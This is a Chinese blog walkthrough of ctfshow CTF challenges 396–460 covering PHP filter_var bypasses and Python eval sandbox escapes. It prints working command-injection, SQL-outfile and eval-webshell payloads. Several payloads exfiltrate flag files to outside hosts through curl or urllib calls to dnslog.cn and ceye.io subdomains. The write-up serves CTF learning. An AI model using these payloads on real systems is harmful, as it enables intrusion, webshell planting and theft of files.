---
title: ctfshow-其他
id: ctfshow-其他
date: 2021-11-09 18:31:30
sidebar_position: 15
---

<!-- more -->

11.1开始写的-，拖着拖着居然写到9号

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1304655068&auto=0&height=66"></iframe>

```
# 上面播放器的代码如下（仅网易云外链链接，其他播放器请自行百度）
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1304655068&auto=0&height=66"></iframe>
# width(宽度) ; height(高度)
# type = 歌曲(1) | 歌单(2) | 电台(3)
# id = 歌曲ID号
# auto = 自动播放(1) | 手动播放(0)
```



## 396

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-15 16:38:07
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-15 17:20:22
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'> '.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

看下`parse_url`这个函数，官方文档：

![](https://i.loli.net/2021/11/01/Ye49mpPS6kVD5Wb.png)

会把host写到path里，因为是shell_exec，那么构造闭合，用$()或者``执行命令就行

```
?url=http://`ls`/var/www/html/1.txt
?url=http://`cat fl0g.php`/var/www/html/1.txt
```



## 397-401

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-01-15 16:38:07
# @Last Modified by:   h1xa
# @Last Modified time: 2021-01-15 17:49:13
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    # if(!preg_match('/;|>|http|https|\|/i', $url['host']))
    shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

输出目录改了，改下payload，用分号来执行下个命令就好了

```
?url=http://1/1;echo `ls` > a.txt
?url=http://1/1;echo `cat fl0g.php` > a.txt
```

398-401就是多了对`url['host']`的正则过滤，把指令都丢path里就好了

## 402

多了对`$url['scheme']`和`$url['host']`的正则匹配

```php
if(preg_match('/http|https/i', $url['scheme'])){
    die('error');
}
if(!preg_match('/;|>|\||base/i', $url['host'])){
    shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
}
```

可以换成http和https被ban了，用file或者其他协议都行

payload：

```
?url=file://1/1;echo `ls` > a.txt
?url=file://1/1;echo `cat fl0g.php` > a.txt
```

## 403

正则里就是对ip的匹配嘛

```php
if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){
    shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
}
```

payload：

```
?url=http://127.0.0.1/1;echo `ls` > a.txt
?url=http://127.0.0.1/1;echo `cat fl0g.php` > a.txt
```

## 404

像题目名称一样--，一直以为是没转好，f12提示看404.php

```php
if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
	if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
		shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
	}
}
```

第一个判断和403的正则有点不一样，去掉了匹配字符串开始结束的`^ &`，在末尾加上了元字符`.`匹配换行以外的任意字符

第二个判断会匹配path是否只有字母数字

把rce部分放在host就行了

payload：

```
404.php?url=http://127.0.0.11;echo `ls` > a.txt||1/1
404.php?url=http://127.0.0.11;echo `cat fl0g.php` > a.txt||1/1
```



## 405

```php
if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
	if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
		if(preg_match('/\~|\.|php/', $url['scheme'])){
			shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
        }
    }
}
```

多加了个对`url['scheme']`的正则匹配

```
?url=httphp://127.0.0.11;echo `ls` > a.txt||1/1
?url=httphp://127.0.0.11;echo `cat fl0g.php` > a.txt||1/1
```



## 406-FILTER_VALIDATE_URL

```php
require 'config.php';
//flag in db
highlight_file(__FILE__);
$url=$_GET['url'];
if(filter_var ($url,FILTER_VALIDATE_URL)){
    $sql = "select * from links where url ='{$url}'";
    $result = $conn->query($sql);
}else{
    echo '不通过';
}
```

> **filter_var()**   (PHP 5 >= 5.2.0, PHP 7)
>
> **功能** ：使用特定的过滤器过滤一个变量
>
> **定义** ：[mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) **filter_var** ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$variable` [, int `$filter` = FILTER_DEFAULT [, [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$options` ]] )
>
> `filter_var()` 函数通过指定的过滤器过滤一个变量。
>
> 如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。
>
> FILTER_VALIDATE_URL 过滤器把值作为 URL 进行验证。
>
> FILTER_FLAG_SCHEME_REQUIRED — 要求 URL 是 RFC 兼容 URL。（比如：[http://example）](http://example)/)
>
> FILTER_FLAG_HOST_REQUIRED — 要求 URL 包含主机名（[http://www.example.com）](http://www.example.com)/)
>
> FILTER_FLAG_PATH_REQUIRED — 要求 URL 在主机名后存在路径（比如：eg.com/example1/）
>
> FILTER_FLAG_QUERY_REQUIRED — 要求 URL 存在查询字符串（比如：”eg.php?age=37"）

> 可以用`http://` `file://` `test://`绕过 **filter_var** 的 **FILTER_VALIDATE_URL** 过滤器
>
> 具体参考这里：[php代码审计危险函数总结 | Wh0ale's Blog](https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/)

因为flag在数据库里，但是这里又没有输出的地方，尝试发现`into outfile`可用

把查询结果输出到网站目录下即可

```
<?php require 'config.php'; $sql = 'select flag from flag into outfile "/var/www/html/a.txt"'; $result = $conn->query($sql); var_dump($result); ?>

# 因为得符合filter_var()的判断，得用/**/代替空格~

?url=file://127.0.0.1;'union/**/select/**/1,0x上面payload的十六进制编码/**/into/**/outfile/**/"/var/www/html/a.php"%23;

?url=file://127.0.0.1;'union/**/select/**/1,0x3c3f70687020726571756972652027636f6e6669672e706870273b202473716c203d202773656c65637420666c61672066726f6d20666c616720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f612e74787422273b2024726573756c74203d2024636f6e6e2d3e7175657279282473716c293b207661725f64756d702824726573756c74293b203f3e/**/into/**/outfile/**/"/var/www/html/a.php"%23;
```

然后访问a.php执行sql语句，再访问a.txt看查询结果



## 407-ipv6和类方法调用

```php
if(filter_var ($ip,FILTER_VALIDATE_IP)){
    call_user_func($ip);
}

class cafe{
    public static function add(){
        echo file_get_contents('flag.php');
    }
}
```

> FILTER_VALIDATE_IP：把值作为 IP 地址来验证。

1. 可以看到定义了一个类，类中定义了个方法，可以这样来调用：`cafe::add`

2. IPv6的128位地址通常写成8组，每组为四个十六进制数的形式,连续的0可用`::`表示

   只要符合filter_var对ip的判断即可`call_user_func($ip);`，而`cafe::add`正好会被认为是IPv6的格式

记得右键查看源代码

```
?ip=cafe::add
```



## 408-FILTER_VALIDATE_EMAIL

```php
if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);
}
```

> FILTER_VALIDATE_IP：把值作为 IP 地址来验证。
>
> 就是说`非法字符放在双引号里面可以绕过email@前缀限制`
>
> 参考这里[php代码审计危险函数总结 | Wh0ale's Blog](https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/)
>
> ![](https://i.loli.net/2021/11/05/8y3XaDu7cgepYqJ.png)

```
?email="<?=eval($_GET[1]);?>"@a.php
```



## 409-FILTER_VALIDATE_EMAIL

```php
if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    $email=preg_replace('/.flag/', '', $email);
    eval($email);
}
```

因为要符合if判断，咱们传入的payload形式是：`"xxx"@xxx`

要利用eval执行php代码，就得避免非php代码格式的东东影响，这里需要把`双引号`以及后面的`@xxx`的影响消除掉

`preg_replace`会把`flag和前面的任意字符`置换为空，后面的`"@xxx`可以用`?>`提前闭合

```
?email="flageval($_GET[1]);?>"@a.com
```

flag~

```
/?email="flageval($_GET[1]);?>"@a.com&1=system('tac /flag');
```



## 410、411-FILTER_VALIDATE_BOOLEAN

```php
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)>0){
   #411 if($b=='true' || intval($b)>0 ||$b=='on' || $b=='ON')
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
}
```

> FILTER_VALIDATE_BOOLEAN：
>
> 如果是 "1", "true", "on" 以及 "yes"，则返回 true；
>
> 如果是 "0", "false", "off", "no" 以及 ""，则返回 false。否则返回 NULL。

传入on或者yes都可以

```
?b=yes
?b=on
还可以大小写：On 或者 oN
```



## 412-注释符//绕过

```php
if(isset($ctfshow)){
    file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);
    include('flag.php');
}
```

> FILE_APPEND：如果文件 filename 已经存在，追加数据而不是覆盖。

可以把传入的东西写进去，但有注释符`//`，`换行%0a`或者用`?>`闭合

```
ctfshow=%0aeval($_POST[1]);?>
ctfshow=?><?=eval($_POST[1]);?>
```



## 413-注释符/**/绕过

```php
if(isset($ctfshow)){
        file_put_contents('flag.php', '/*'.$ctfshow.'*/',FILE_APPEND);
    include('flag.php');
}
```

直接闭合他们就好了

```
ctfshow=*/eval($_POST[1]);/*
```



## 414-intaval

```php
if($ctfshow==true){
    if(sqrt($ctfshow)>=sqrt(intval($flag))){
        echo 'FLAG_NOT_HERE';
    }else{
        echo $flag;
    }
}
```

intval()字符串的值是0

要小于它，取负数就好

```
?ctfshow=-1
```



## 415-php中类和方法大小写不敏感

```php
function getflag(){
    echo file_get_contents('flag.php');
}

if($k=='getflag'){
    die('FLAG_NOT_HERE');
}else{
    call_user_func($k);
}
```

php对类和函数大小写不敏感

```
?k=getFlag
```



## 416

```php
class ctf{
    public function getflag(){
        return 'fake flag';
    }
    final public function flag(){
        echo file_get_contents('flag.php');
    }
}

class show extends ctf{
    public function __construct($f){
        call_user_func($f);
    }
}

echo new show($_GET[f]);
```

调用类中方法

```
?f=ctf::flag
```



## 417-php混淆

给了源码下载，用网站：[php解密加密](https://www.zhaoyuanma.com/phpjm.html)  解密一下得到：

```php
<?php
error_reporting(0);
include('flag.php');
$c=$_GET['ctf'];
if($c=='show'){
	echo $flag;
}else{
	echo 'FLAG_NOT_HERE';
}
?>
```

传入`?ctf=show`即可

> 或者参考尘~落师傅的解法：[ctfshow-其他 | 尘～落 (chenluo77.com)](http://chenluo77.com/2021/08/06/9898.html#toc-heading-15)



## 418-extract()变量覆盖

```php
$key= 0;
$clear='clear.php';
highlight_file(__FILE__);

//获取参数
$ctfshow=$_GET['ctfshow'];
//包含清理脚本
include($clear);


extract($_POST);
if($key===0x36d){
    //帮黑阔写好后门
    eval('<?php '.$ctfshow.'?>');
}else{
    $die?die('FLAG_NOT_HERE'):clear($clear);
}

function clear($log){
    shell_exec('rm -rf '.$log);
}
```

一开始没看到下面这个==

因为`$key===0x36d`是强比较，咱们传参传入的是字符串，无法符合判断

这里是利用`extract($_POST);`变量覆盖，触发三元运算符`$die?die('FLAG_NOT_HERE'):clear($clear);`

> ```
> (expr1)?(expr2):(expr3); //表达式1?表达式2:表达式3
> ```
>
> 如果条件“expr1”成立，则执行语句“expr2”，否则执行“expr3”。

```
die=0&clear=;echo `ls` > a.txt;
die=0&clear=;echo `tac flag.php` > a.txt;
```



## 419-长度限制17

```php
$code = $_POST['code'];
if(strlen($code) < 17){
    eval($code);
}
```

限制长度

```
code=echo `ls`;
code=echo `tac f*`;
```



## 420-长度限制8

```php
$code = $_POST['code'];
if(strlen($code) < 8){
    system($code);
}
```

flag在上级目录

```
code=ls ../
code=nl ../*
```

还有这种：[命令注入长度限制绕过 - ctrl_TT豆 - 博客园 (cnblogs.com)](https://www.cnblogs.com/-chenxs/p/11981586.html)

从y4师傅那偷个脚本

```python
import requests
import time

payload = [
    '>sh ',
    '>ba\\',
    '>\|\\',
    '>2\\',
    '>2x\\',
    '>xxx.\\',
    '>9x.\\',
    '>1\\',
    '>2.\\',
    '>4\\',
    '>\ \\',
    '>curl\\',
    # '>cu\\',
]

for i in payload:
    # assert len(i) <= 8
    data = {
        'code': str(i)
    }
    r = requests.post('http://51d55836-836d-42df-80c1-1888d41ceb5a.challenge.ctf.show/', data=data)
    print(i)
    time.sleep(1)
```

## 421-长度限制6

```php
$code = $_POST['code'];
if(strlen($code) < 6){
    system($code);
}
```

flag在当前目录

```
code=ls
code=nl f*
```

## 422-长度限制5

```php
$code = $_POST['code'];
if(strlen($code) < 5){
    system($code);
}
```

```
code=nl *
```





## 423~431-python命令执行

python不是很熟，学习了一波yu师傅的wp：[CTFSHOW其他篇 羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/112692697)

> 听说是yu师傅用特殊方式得到的最原始源码：
>
> ```python
> from flask import Flask
> from flask import request
> import os
> 
> app = Flask(__name__)
> @app.route('/')
> def app_index():
>     code = request.args.get('code')
>     if code:
>     	return eval(code)
>     return 'where is flag?<!-- /?code -->'
> 
> if __name__=="__main__":
>     app.run(host='0.0.0.0',port=80)
> ```

423：导入了os模块

```
?code=os.popen('cat /flag').read()
?code=open('/flag').read()
```

后面去掉了`import os`，还有增加了各种过滤：`os|open|system|read|eval|str`，

但是这些过滤只会匹配开头。空格绕过即可

```
?code=%20str(open('/flag').read())
```



## 432~434

后面就是正常过滤了，

payload有点类似ssti模版注入，也是找模块来执行，注意return的返回得是字符串，可以加个str()

这里用dns外带:[DNSLog Platform](http://www.dnslog.cn/)



关于过滤了啥可以看yu师傅的wp：[CTFSHOW其他篇—羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/112692697)
(下面引号里的基本都是抄yu师傅博客的~)

拼接绕过就好

> 432过滤了`os|open|system|read|eval`

```
?code=str(''.__class__.__mro__[1].__subclasses__()[185].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').__dict__['pop'+'en']('curl `cat /flag`.xxxx.dnslog.cn'))
```

> 433本题过滤了`os|open|system|read|eval|builtins`

```
?code=str(''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('curl `cat /flag`.xxx.dnslog.cn'))
```

> 434过滤了`os|open|system|read|eval|builtins|curl`

```
?code=str(''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['po'+'pen']('cu'+'rl `cat /flag`.xxx.dnslog.cn'))
```



## 435~439

把下划线过滤了，
可以用`attr()`、`getattr()`啥的但是这个方法一打就是500，可能我的payload有问题QAQ
也可以用`request`

> 435过滤了`os|open|system|read|eval|builtins|curl|_`

> 436过滤了`os|open|system|read|eval|builtins|curl|_|getattr`

> 437过滤了`os|open|system|read|eval|builtins|curl|_|getattr`

> 438过滤了`os|open|system|read|eval|builtins|curl|_|getattr|{`

> 439过滤了`os|open|system|read|eval|builtins|curl|_|getattr|{`

> **python里面可以用分号执行多条语句**

像yu师傅的切片倒序+exec()

```
?code=str(exec(')"nc.golsnd.xxx.`*f/ tac` lruc"(metsys.so ;so tropmi'[::-1]))
```



## 440

> 过滤了`os|open|system|read|eval|builtins|curl|_|getattr|{|'|"`
>
> 没有引号，可以用chr构造字符串

```python
p = "import os;os.system('curl `cat /f*`.0kfz6y.dnslog.cn')"
c = ""
for i in p:
  c += "chr({})%2b".format(ord(i))
print("?code=str(exec("+c[:-3]+"))")
```

## 441

```
?code=str(exec(request.args.get(chr(97))))&a=import os;os.system('curl `cat /f*`.xxx.dnslog.cn')
```

## 442

> 过滤了数字，找些特殊的字符串就好
> 像yu师傅：`request.method`
>
> 或者用`str(True)`
>
> 也可以用`len(str(True))`还有`True-(-True)`配合运算符来构造数字
>
> ![](https://i.loli.net/2021/11/08/C94NGnAl6jOtv8r.png)

```
?code=str(exec(request.args.get(request.method)))&get=import os;os.system('curl `cat /f*`.xxx.dnslog.cn')

?code=str(exec(request.args.get(str(True))))&True=import os;os.system('curl `cat /f*`.xxx.dnslog.cn')
```



## 443~444

> 提交参数改为post，过滤了数字和`request`
>
> 444给出源码
> 过滤了：`os|open|system|read|eval|builtins|curl|_|getattr|{|\'|"|\+|[0-9]|request|len`

学yu师傅的做法：

> `globals()`：以字典类型返回当前位置的全部全局变量
>
> `keys()`：字典 keys() 方法返回一个视图对象

```
code=str(globals())
```

![](https://i.loli.net/2021/11/09/J7tLVuHSkCmoAe4.png)

利用`True-(-True)`来构造数字，搭配`list()`转换为列表从而取到`request`

```
code=str(list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)])
```

![](https://i.loli.net/2021/11/09/2q1pzOWgnwtLJc7.png)



然后就可以以`globals()[request]`的形式调用了：

```
code=str(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]])
```

大概像这样：

![](https://i.loli.net/2021/11/09/WiQuR68dLK45DTH.png)



payload：

```
?True=import os;os.system('curl `cat /f*`.xxx.dnslog.cn')

post：
code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(str(True))))
```



## 445-447

> 同样给出源码，和444区别是import部分
>
> import了os，但是把其中的`system`和`popen`给`del`掉了
>
> ```python
> import os
> del os.system
> del os.popen
> ```
>
> 参考y4师傅`reload`加载模块：
>
> ```python
> from importlib import reload;import os;reload(os);
> ```

```
?True=from importlib import reload;import os;reload(os);os.system('curl `cat /f*`.xxx.dnslog.cn')

post：
code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(str(True))))
```

> 446虽然把reload删了，但是引用的模块不一样，所以上面的payload还是能过
>
> ```python
> import os
> import imp
> del os.system
> del os.popen
> del imp.reload
> ```



> 447,del了更多东西，但跟咱们的payload没啥关系
>
> ```python
> import os
> import imp
> del os.system
> del os.popen
> del imp.reload
> import subprocess
> del subprocess.Popen
> del subprocess.call
> del subprocess.run
> del subprocess.getstatusoutput
> del subprocess.getoutput
> del subprocess.check_call
> del subprocess.check_output
> import timeit
> del timeit.timeit
> ```



## 448

> ```python
> import sys 
> sys.modules['os']=None
> sys.modules['imp']=None
> sys.modules['subprocess']=None
> sys.modules['socket']=None
> sys.modules['timeit']=None
> sys.modules['platform']=None
> ```



可以把`sys.modules['os']`del了再重新`import os`

或者利用`shutil`复制os的内容给新的py文件再引用：

```python
import sys;del sys.modules['os'];import os;os.system()

import shutil;shutil.copy('/usr/local/lib/python3.8/os.py','a.py');import a;a.system()
```

还有y4师傅的这种做法

> Python包的环境变量有很多个，优先sys，waf是读到sys，os为none， 所以报错解决方式可以把他删了，系统找不到就会去下一个环境变量找
>
> ```python
> import sys
> del sys.modules['os']
> import os
> os.system() 
> ```



payload：

```
?True=import sys;del sys.modules['os'];import os;os.system('curl `cat /f*`.6gc26k.dnslog.cn')

?True=import shutil;shutil.copy('/usr/local/lib/python3.8/os.py','a.py');import a;a.system('curl `cat /f*`.xxx.dnslog.cn')

?True=import sys;del sys.modules['os'];import os;os.system('curl `cat /f*`.xxx.dnslog.cn') 


post：
code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(str(True))))
```

## 449

> ```python
> import sys 
> sys.modules['os']=None
> sys.modules['imp']=None
> sys.modules['subprocess']=None
> sys.modules['socket']=None
> sys.modules['timeit']=None
> sys.modules['platform']=None
> sys.modules['sys']=None
> 
> app = Flask(__name__)
> sys.modules['importlib']=None
> del sys
> ```

yu师傅的方法，直接读文件带出来，这么一看好像前面也可以用啊

```
?True=s=open('/flag').read();import urllib;urllib.request.urlopen('http://xxx.ceye.io?flag='%2bs)

code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(str(True))))
```



## 450-^异或

终于不是python了！！！

> hint：另类rce,执行phpinfo就可以拿到flag
>
> ```php
> <?php
> 
> /*
> # -*- coding: utf-8 -*-
> # @Author: h1xa
> # @Date:   2021-02-03 22:57:52
> # @Last Modified by:   h1xa
> # @Last Modified time: 2021-02-04 14:28:30
> # @email: h1xa@ctfer.com
> # @link: https://ctfer.com
> 
> */
> 
> highlight_file(__FILE__);
> $ctfshow=$_GET['ctfshow'];
> 
> 
> if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
>     eval("($ctfshow)();");
> }
> 
> ```

需要匹配正则才行（大概就是`字母^字母^字母`），执行phpinfo就有flag，根据异或的原理

```
?ctfshow=phpinfo^phpinfo^phpinfo
```



## 451-^异或

> hint：另类rce,执行phpinfo就可以拿到flag
>
> ```php
> <?php
> 
> /*
> # -*- coding: utf-8 -*-
> # @Author: h1xa
> # @Date:   2021-02-03 22:57:52
> # @Last Modified by:   h1xa
> # @Last Modified time: 2021-02-04 15:38:05
> # @email: h1xa@ctfer.com
> # @link: https://ctfer.com
> 
> */
> 
> highlight_file(__FILE__);
> $ctfshow=$_GET['ctfshow'];
> 
> 
> if(preg_match('/^[a-z]+[\^][a-z]+[\^][a-z]+$/', $ctfshow)){
>     if(!preg_match('/phpinfo/', $ctfshow)){
>         eval("($ctfshow)();");
>     }
> }
> 
> ```

还是异或，但多了个正则检测，要求$ctfshow里不能有phpinfo

找一个字母单独异或

```
?ctfshow=phpanfo^phpznfo^phprnfo
```

## 452

> hint：另类rce,执行phpinfo就可以拿到flag
>
> ```php
> <?php
> 
> /*
> # -*- coding: utf-8 -*-
> # @Author: h1xa
> # @Date:   2021-02-03 22:57:52
> # @Last Modified by:   h1xa
> # @Last Modified time: 2021-02-04 16:05:23
> # @email: h1xa@ctfer.com
> # @link: https://ctfer.com
> 
> */
> 
> highlight_file(__FILE__);
> $ctfshow=$_GET['ctfshow'];
> 
> 
> if(!preg_match('/\'|\"|[0-9]|\{|\[|\~|\^|phpinfo|\$/i', $ctfshow)){
>     eval($ctfshow);
> }
> ```

反引号能rce

```
?ctfshow=echo `cat /flaag`;
```

或者`phpinfo()`也行

```
?ctfshow=((p).(h).(p).(i).(n).(f).(o))();
```



## 453~456

> 另类rce,额，反正就是很另类的样子

f12查看

```html
<!--/ctf/show?s=XXX  file_get_contents($_POST['s'])-->
```

可以先读下index.php的源码

```
url/ctf/show?s=XXX

post:
s=index.php
```

index.php

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-02-04 22:43:04
# @Last Modified by:   h1xa
# @Last Modified time: 2021-02-05 02:03:03
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$http = new Swoole\Http\Server('0.0.0.0', 80);

$http->on('start', function ($server) {
    echo "Swoole http server is started at http://0.0.0.0:80\n";
});

$http->on('request', function ($request, $response) {
    list($controller, $action) = explode('/', trim($request->server['request_uri'], '/'));
    $route = array('ctf');
    $method = array('show','file','exec');
    if(in_array($controller, $route) && in_array($action, $method)){
    	(new $controller)->$action($request, $response);
    }else{
    	 $response->end('<h3>where is flag?</h3><!--/ctf/show?s=XXX  file_get_contents($_POST[\'s\'])-->');
    }
    
});
$http->start();

class ctf{
	public function show($request,$response){
		 $response->header('Content-Type', 'text/html; charset=utf-8');
		 $s=$request->post['s'];
		 if(isset($s)){
		 	$response->end(file_get_contents($s));
		 }else{
		 	$response->end('s not found');
		 }
	}
	public function file($request,$response){
 		 $response->header('Content-Type', 'text/html; charset=utf-8');
		 $s=$request->post['s'];
		 if(isset($s)){
		 	file_put_contents('shell.php', $s);
		 	$response->end('file write done in /var/www/shell.php');
		 }else{
		 	$response->end('s not found');
		 }
	}
	public function exec($request,$response){
		system('php shell.php');
		$response->end('command exec done');
	}
}
```

大概是说，在`/ctf/file post`借助参数`s`传的数据会写入到shell.php中，
当访问`/ctf/exec`就会去执行`php shell.php`

那内容随意发挥了,本来想写到txt里直接看的，但是路径有点蒙，还是把内容带出来吧

> 453、455、456
>
> ```
> url/ctf/file
> s=<?php system('curl http://w0gind.ceye.io?flag=`cat f*`'); ?>
> 
> url/ctf/exec
> ```

> 454
>
> ```
> url/ctf/file
> s=<?php system('curl http://w0gind.ceye.io?flag=`cat f*`'); ?>
> 
> url/ctf/include
> ```



## 457

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-02-06 01:58:32
# @Last Modified by:   h1xa
# @Last Modified time: 2021-02-06 12:19:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
abstract class user{
    public  $username;
    public  $password;
    function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    abstract  public  function check();
}

class visitor extends user{
    public  function check(){
        return ($this->username!=='admin' && $this->password!=='admin888');
    }
}

class admin extends user{
    public  function check(){
        $u= call_user_func($this->password);
        return $u=='admin';
    }
}


$u=$_GET['u'];
$p=$_GET['p'];

if(isset($u)&&isset($p)){
    if((new visitor($u,$p))->check()){
        die('welcome visitor :'.$u);
    }
    if((new admin($u,$p))->check()){
        die('welcome admin :'.$u.' flag is :'.$flag);
    }
}
```

进入第二个if判断即可，

1. 需要`visitor->checl()`返回false：即`username为admin` 或 `password为admin888`
2. 需要`admin->check()`返回true：即`call_user_func($this->password)`=='admin'

`true和字符串`的弱比较结果为`true`；而`phpinfo()`会返回true

![](https://i.loli.net/2021/11/09/wxmMWnr37PZiV4l.png)

```
?u=admin&p=phpinfo
```



## 458

就改了一点：`$u==='admin'`

看y4师傅的解法：

> get_class(): 获取当前调用方法的类名;
>
> get_called_class():获取静态绑定后的类名；

## 459

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-02-06 01:58:32
# @Last Modified by:   h1xa
# @Last Modified time: 2021-02-06 13:25:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
error_reporting(0);
include('flag.php');


$u=$_GET['u'];
$p=$_GET['p'];

if(isset($u)&&isset($p)){
    copy($u, $p.'.php');
}
```

可以伪协议读文件，然后访问a.php

```
?u=php://filter/convert.base64-encode/resource=flag.php&p=a
```



## 460

整不出=-=





## 参考文章

[CTFSHOW-其他WP_Y4tacker的博客-CSDN博客_ctfshow 其他](https://blog.csdn.net/solitudi/article/details/113778651)

[CTFSHOW其他篇羽的博客-CSDN博客_ctfshow 其他](https://blog.csdn.net/miuzzx/article/details/112692697)

